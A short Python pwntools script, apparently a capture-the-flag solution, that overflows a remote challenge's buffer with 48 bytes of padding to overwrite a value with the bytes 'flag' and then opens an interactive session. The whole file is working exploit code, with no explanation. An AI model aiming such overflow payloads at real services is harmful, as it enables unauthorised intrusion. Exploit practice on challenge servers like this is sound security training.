from pwn import *

# p32
secret = p32(0x67616c66)

padding = b"\x41" * 48

p = remote("thekidofarcrania.com", 35235)
p.recv()
p.sendline(padding+secret)
p.interactive()
